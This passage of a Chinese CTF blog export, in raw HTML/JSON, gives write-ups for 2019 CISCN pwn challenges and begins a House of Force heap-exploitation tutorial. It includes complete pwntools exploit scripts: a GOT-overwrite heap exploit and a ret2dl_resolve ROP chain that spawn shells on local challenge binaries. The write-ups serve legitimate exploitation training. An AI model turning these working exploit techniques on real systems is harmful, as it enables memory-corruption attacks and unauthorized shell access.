class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"c\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br></pre></td></tr></table></figure>\n<p>由于atoi只能输入5位，考虑劫持别的got。所以最后选择覆盖free@got，然后布置/bin/sh\\x00在chunk上即可。</p>\n<h4 id=\"完整exp-1\"><a href=\"#完整exp-1\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> time <span class=\"keyword\">import</span> sleep</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./pwn\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"data:\\n\"</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">change</span><span class=\"params\">(index, content)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\">    sleep(<span class=\"number\">0.1</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">free</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"&gt; \"</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">\"index: \"</span>)</span><br><span class=\"line\">    p.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># leak libc</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 0</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 1</span></span><br><span class=\"line\">add(<span class=\"string\">\"/bin/sh\\x00\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 2</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">0</span>) <span class=\"comment\"># head is 1</span></span><br><span class=\"line\">show(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>, <span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\">libc.address = addr - <span class=\"number\">0x3c4b78</span></span><br><span class=\"line\">main_arena = addr - <span class=\"number\">88</span></span><br><span class=\"line\">free_got = elf.got[<span class=\"string\">\"free\"</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\">binsh = next(libc.search(<span class=\"string\">\"/bin/sh\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># make type confusion</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 3</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 4</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\">free(<span class=\"number\">6</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x20</span> * <span class=\"string\">\"a\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 5</span></span><br><span class=\"line\">add(<span class=\"number\">0x10</span> * <span class=\"string\">\"c\"</span> + <span class=\"string\">\"\\n\"</span>) <span class=\"comment\"># 6</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># hijack got</span></span><br><span class=\"line\">payload = p32(<span class=\"number\">6</span>) + p32(<span class=\"number\">0x10</span>) + p64(free_got)</span><br><span class=\"line\">change(<span class=\"number\">4</span>, payload + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">change(<span class=\"number\">6</span>, p64(system) + <span class=\"string\">\"\\n\"</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x03-baby-pwn\"><a href=\"#0x03-baby-pwn\" class=\"headerlink\" title=\"0x03  baby_pwn\"></a>0x03  baby_pwn</h2><h3 id=\"分析-3\"><a href=\"#分析-3\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>就是re2dl_resolve。</p>\n<p>直接修改XDCTF2015的exp即可。</p>\n<p>步骤有：</p>\n<ol>\n<li>找ppp、popebp、leave;ret等作stack pivoting的gadget；</li>\n<li>找到plt段，rel_plt段，dynsym段，dynstr等段的地址</li>\n<li>构造即可rel_plt重定位到dynsym表。</li>\n</ol>\n<p>readelf的使用如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/2019_guosai/baby_pwn$ readelf -S pwn</span><br><span class=\"line\">There are 31 section headers, starting at offset 0x18b0:</span><br><span class=\"line\"></span><br><span class=\"line\">Section Headers:</span><br><span class=\"line\">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class=\"line\">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class=\"line\">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class=\"line\">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class=\"line\">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class=\"line\">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000030 04   A  5   0  4</span><br><span class=\"line\">  [ 5] .dynsym           DYNSYM          080481dc 0001dc 0000a0 10   A  6   1  4</span><br><span class=\"line\">  [ 6] .dynstr           STRTAB          0804827c 00027c 00006c 00   A  0   0  1</span><br><span class=\"line\">  [ 7] .gnu.version      VERSYM          080482e8 0002e8 000014 02   A  5   0  2</span><br><span class=\"line\">  [ 8] .gnu.version_r    VERNEED         080482fc 0002fc 000020 00   A  6   1  4</span><br><span class=\"line\">  [ 9] .rel.dyn          REL             0804831c 00031c 000020 08   A  5   0  4</span><br><span class=\"line\">  [10] .rel.plt          REL             0804833c 00033c 000020 08  AI  5  24  4</span><br><span class=\"line\">  [11] .init             PROGBITS        0804835c 00035c 000023 00  AX  0   0  4</span><br><span class=\"line\">  [12] .plt              PROGBITS        08048380 000380 000050 04  AX  0   0 16</span><br><span class=\"line\">  [13] .plt.got          PROGBITS        080483d0 0003d0 000008 00  AX  0   0  8</span><br><span class=\"line\">  [14] .text             PROGBITS        080483e0 0003e0 000202 00  AX  0   0 16</span><br><span class=\"line\">  [15] .fini             PROGBITS        080485e4 0005e4 000014 00  AX  0   0  4</span><br><span class=\"line\">  [16] .rodata           PROGBITS        080485f8 0005f8 000008 00   A  0   0  4</span><br><span class=\"line\">  [17] .eh_frame_hdr     PROGBITS        08048600 000600 00003c 00   A  0   0  4</span><br><span class=\"line\">  [18] .eh_frame         PROGBITS        0804863c 00063c 00010c 00   A  0   0  4</span><br><span class=\"line\">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class=\"line\">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class=\"line\">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class=\"line\">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class=\"line\">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class=\"line\">  [24] .got.plt          PROGBITS        0804a000 001000 00001c 04  WA  0   0  4</span><br><span class=\"line\">  [25] .data             PROGBITS        0804a01c 00101c 000008 00  WA  0   0  4</span><br><span class=\"line\">  [26] .bss              NOBITS          0804a040 001024 00002c 00  WA  0   0 32</span><br><span class=\"line\">  [27] .comment          PROGBITS        00000000 001024 000035 01  MS  0   0  1</span><br><span class=\"line\">  [28] .shstrtab         STRTAB          00000000 0017a5 00010a 00      0   0  1</span><br><span class=\"line\">  [29] .symtab           SYMTAB          00000000 00105c 0004c0 10     30  47  4</span><br><span class=\"line\">  [30] .strtab           STRTAB          00000000 00151c 000289 00      0   0  1</span><br><span class=\"line\">Key to Flags:</span><br><span class=\"line\">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class=\"line\">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class=\"line\">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-3\"><a href=\"#利用-3\" class=\"headerlink\" title=\"利用\"></a>利用</h3><h4 id=\"完整exp：\"><a href=\"#完整exp：\" class=\"headerlink\" title=\"完整exp：\"></a>完整exp：</h4><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">'./pwn'</span>)</span><br><span class=\"line\">offset = <span class=\"number\">44</span></span><br><span class=\"line\">read_plt = elf.plt[<span class=\"string\">'read'</span>]</span><br><span class=\"line\"><span class=\"comment\"># write_plt = elf.plt['write']</span></span><br><span class=\"line\"></span><br><span class=\"line\">ppp_ret = <span class=\"number\">0x080485d9</span> <span class=\"comment\"># 0x080485d9 : pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class=\"line\">pop_ebp_ret = <span class=\"number\">0x080485db</span> <span class=\"comment\"># 0x080485db : pop ebp ; ret</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x08048448</span>\t <span class=\"comment\"># 0x08048448 : leave ; ret</span></span><br><span class=\"line\"></span><br><span class=\"line\">stack_size = <span class=\"number\">0x800</span></span><br><span class=\"line\">bss_addr = <span class=\"number\">0x0804a040</span> <span class=\"comment\"># readelf -S bof | grep \".bss\"</span></span><br><span class=\"line\">base_stage = bss_addr + stack_size</span><br><span class=\"line\"></span><br><span class=\"line\">p = process(<span class=\"string\">'./pwn'</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">'A'</span> * offset</span><br><span class=\"line\">payload += p32(read_plt) </span><br><span class=\"line\">payload += p32(ppp_ret)</span><br><span class=\"line\">payload += p32(<span class=\"number\">0</span>)</span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(<span class=\"number\">100</span>)</span><br><span class=\"line\">payload += p32(pop_ebp_ret) </span><br><span class=\"line\">payload += p32(base_stage)</span><br><span class=\"line\">payload += p32(leave_ret) </span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">cmd = <span class=\"string\">\"/bin/sh\"</span></span><br><span class=\"line\">plt_0 = <span class=\"number\">0x08048380</span></span><br><span class=\"line\">rel_plt = <span class=\"number\">0x0804833c</span></span><br><span class=\"line\">index_offset = (base_stage + <span class=\"number\">28</span>) - rel_plt</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">dynsym = <span class=\"number\">0x080481dc</span></span><br><span class=\"line\">dynstr = <span class=\"number\">0x0804827c</span></span><br><span class=\"line\">fake_sym_addr = base_stage + <span class=\"number\">36</span></span><br><span class=\"line\">align = <span class=\"number\">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class=\"number\">0xf</span>)</span><br><span class=\"line\">fake_sym_addr = fake_sym_addr + align</span><br><span class=\"line\">index_dynsym = (fake_sym_addr - dynsym) / <span class=\"number\">0x10</span></span><br><span class=\"line\">r_info = (index_dynsym &lt;&lt; <span class=\"number\">8</span>) | <span class=\"number\">0x7</span></span><br><span class=\"line\">fake_reloc = p32(read_got) + p32(r_info)</span><br><span class=\"line\">st_name = (fake_sym_addr + <span class=\"number\">0x10</span>) - dynstr</span><br><span class=\"line\">fake_sym = p32(st_name) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0</span>) + p32(<span class=\"number\">0x12</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload2 = <span class=\"string\">'AAAA'</span></span><br><span class=\"line\">payload2 += p32(plt_0)</span><br><span class=\"line\">payload2 += p32(index_offset)</span><br><span class=\"line\">payload2 += <span class=\"string\">'AAAA'</span></span><br><span class=\"line\">payload2 += p32(base_stage + <span class=\"number\">80</span>)</span><br><span class=\"line\">payload2 += <span class=\"string\">'aaaa'</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'aaaa'</span></span><br><span class=\"line\">payload2 += fake_reloc </span><br><span class=\"line\">payload2 += <span class=\"string\">'B'</span> * align</span><br><span class=\"line\">payload2 += fake_sym </span><br><span class=\"line\">payload2 += <span class=\"string\">\"system\\x00\"</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'A'</span> * (<span class=\"number\">80</span> - len(payload2))</span><br><span class=\"line\">payload2 += cmd + <span class=\"string\">'\\x00'</span></span><br><span class=\"line\">payload2 += <span class=\"string\">'A'</span> * (<span class=\"number\">100</span> - len(payload2))</span><br><span class=\"line\">p.sendline(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"0x04-BMS\"><a href=\"#0x04-BMS\" class=\"headerlink\" title=\"0x04 BMS\"></a>0x04 BMS</h2>","text":"2019CISCN_PWN题解0x00  Your_pwn防护1<br>2<br>3<br>4<br>5<br>6<br>7<br>liwc@ubuntu:~/pwn/2019_guosai/your_pwn$ checksec pwn<br>[*] &apos;/home/li","link":"","raw":null,"photos":[],"categories":[],"tags":[{"name":"pwn","slug":"pwn","count":6,"path":"api/tags/pwn.json"}]},{"title":"Top Chunk利用","slug":"Top Chunk利用","date":"2019-04-21T02:58:07.000Z","updated":"2019-04-21T03:19:46.757Z","comments":true,"path":"api/articles/Top Chunk利用.json","excerpt":"","keywords":null,"cover":null,"content":"<p>本文讲一下近期学习的两种围绕Top Chunk做文章的堆利用方法：House of Force和直接修改main_arena中的top指针。</p>\n<h2 id=\"House-of-force（Top-chunk劫持）\"><a href=\"#House-of-force（Top-chunk劫持）\" class=\"headerlink\" title=\"House of force（Top chunk劫持）\"></a>House of force（Top chunk劫持）</h2><h3 id=\"top-chunk的分割机制与利用点\"><a href=\"#top-chunk的分割机制与利用点\" class=\"headerlink\" title=\"top chunk的分割机制与利用点\"></a>top chunk的分割机制与利用点</h3><p>众所周知，top chunk的作用是作为后备堆空间，在各bin中没有chunk可提供时，分割出一个chunk提供给用户。那么这个分割过程是怎样的呢？我们来看一份源码：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">victim = av-&gt;top;</span><br><span class=\"line\">size   = chunksize(victim);</span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (size) &gt;= (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">long</span>) (nb + MINSIZE)) <span class=\"comment\">//检查请求size是否可以分配</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    remainder_size = size - nb; <span class=\"comment\">// 分配后size，此处nb为有符号数</span></span><br><span class=\"line\">    remainder      = chunk_at_offset(victim, nb); <span class=\"comment\">// 分配后指针</span></span><br><span class=\"line\">    av-&gt;top        = remainder; <span class=\"comment\">// top = 分配后的指针</span></span><br><span class=\"line\">    set_head(victim, nb | PREV_INUSE | <span class=\"comment\">// 设置PREV_INUSE和NON_MAIN_ARENA</span></span><br><span class=\"line\">            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>)); </span><br><span class=\"line\">    set_head(remainder, remainder_size | PREV_INUSE); <span class=\"comment\">//设置top</span></span><br><span class=\"line\"></span><br><span class=\"line\">    check_malloced_chunk(av, victim, nb);</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *p = chunk2mem(victim);</span><br><span class=\"line\">    alloc_perturb(p, bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>首先是libc会检查用户申请的大小，top chunk是否能给的起，如果给得起，就由top chunk的head处，以用户申请大小所匹配的chunk大小为偏移量，将top chunk的位置推到新的位置，而原来的top chunk head处就作为新的堆块被分配给用户了</p>\n<p>试想，如果我们能控制top chunk在这个过程中推到任意位置，也就是说，如果我们能控制用户申请的大小为任意值，我们就能将top chunk劫持到任意内存地址，然后就可以控制目标内存。</p>\n<p>一般来说，pwn中劫持控制流常常取malloc_hook, got表等指针，与堆空间中的top chunk相聚甚远，远到所需要申请的size必定超过top chunk现有的大小，无法控制if条件的检查。</p>\n<p>但是，我们看到if条件检查时size被强制转换为unsigned long，所以如果我们将size溢出覆盖为0xffffffff（-1），那么我们可以任意申请。此外，虽然此处的检查中，用户申请的大小也被当作无符号整数对待，但是在后面推top chunk的时候是以int对待的，所以可以劫持到低地址，加负数。</p>\n<h3 id=\"利用条件\"><a href=\"#利用条件\" class=\"headerlink\" title=\"利用条件\"></a>利用条件</h3><ul>\n<li>用户可以修改top chunk的size字段</li>\n<li>用户可以申请任意大小的堆内存（包括负数）</li>\n</ul>\n<h2 id=\"bctf-2016-bcloud\"><a href=\"#bctf-2016-bcloud\" class=\"headerlink\" title=\"bctf 2016 bcloud\"></a>bctf 2016 bcloud</h2><h3 id=\"防护\"><a href=\"#防护\" class=\"headerlink\" title=\"防护\"></a>防护</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/pwn/heap/house-of-force/2016_bctf_bcloud$ checksec bcloud</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/pwn/heap/house-of-force/2016_bctf_bcloud/bcloud&apos;</span><br><span class=\"line\">    Arch:     i386-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>\n<p>没有开启PIE，RELRO也只开了一部分，所以可以劫持got表，同时注意是一道32位的题。</p>\n<h3 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>main函数一开始在设置缓冲区之后，会调用init_bloud函数，首先要求输入名字，然后malloc(0x40)，将指针放在bss段上的name处，然后输出name中的数据。</p>\n<p>然后会调用init_org_host函数，输入org和host，都放在bss段上。</p>\n<h4 id=\"init-org-host\"><a href=\"#init-org-host\" class=\"headerlink\" title=\"init_org_host\"></a>init_org_host</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> <span class=\"title\">init_org_host</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">char</span> s; <span class=\"comment\">// [esp+1Ch] [ebp-9Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v2; <span class=\"comment\">// [esp+5Ch] [ebp-5Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> v3; <span class=\"comment\">// [esp+60h] [ebp-58h]</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> *v4; <span class=\"comment\">// [esp+A4h] [ebp-14h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v5; <span class=\"comment\">// [esp+ACh] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readgsdword(<span class=\"number\">0x14</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(&amp;s, <span class=\"number\">0</span>, <span class=\"number\">0x90</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Org:\"</span>);</span><br><span class=\"line\">  read_str(&amp;s, <span class=\"number\">64</span>, <span class=\"number\">10</span>);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">\"Host:\"</span>);</span><br><span class=\"line\">  